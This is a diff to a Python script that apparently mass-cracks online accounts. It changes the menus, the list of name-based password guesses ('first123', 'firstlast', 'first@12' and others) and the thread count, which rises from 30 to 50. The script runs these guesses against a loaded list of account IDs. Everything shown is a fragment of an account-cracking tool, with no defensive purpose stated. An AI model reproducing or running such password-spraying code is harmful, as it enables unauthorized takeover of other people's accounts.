@@ -485,24 +485,23 @@ def f_clone():
     for x in file_idz:
         idz.append(x)
     clear()
-    print(" [1] METHOD 1 ")
-    print(" [2] METHOD 2 ")
-    print(" [3] METHOD 3 ")
+    print(f"{green} [1] METHOD 1 ")
+    print(f"{green} [2] METHOD 2 ")
+    print(f"{green} [3] METHOD 3 ")
     linex()
-    m = input(" [â¢] SELECT : ")
+    m = input(f"{green} [-] SELECT : ")
     clear()
-   #print(" [1] CRACK WITH AUTO PASS ")
-    print(" [2] CRACK WITH MANUAL PASS ")
+    print(f"{green} [1] CRACK WITH AUTO PASS ")
+    print(f"{green} [2] CRACK WITH MANUAL PASS ")
     linex()
     p = input("\033[1;32m[\033[1;31m✓\033[1;32m] SELECT : ")
     if p == "1":
-        plist.append("first123")
-        plist.append("first@123")
-        plist.append("first@1234")
-        plist.append("firstlast")
         plist.append("first last")
-        plist.append("57273200")
+        plist.append("first1234")
+        plist.append("firstlast123")
+        plist.append("first123")
         plist.append("59039200")
+        plist.append("57273200")
         plist.append("first@12")
     else:
         clear()
@@ -515,7 +514,7 @@ def f_clone():
         for SUMON in range(plimit):
             ap = input(f" [{SUMON+1}] ENTER PASSWORD : ")
             plist.append(ap)
-    with ThreadPool(max_workers=30) as SUMON_xd:
+    with ThreadPool(max_workers=50) as SUMON_xd:
         clear()
         tl = str(len(idz))
         print("\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL ACCOUNTS : "+tl)
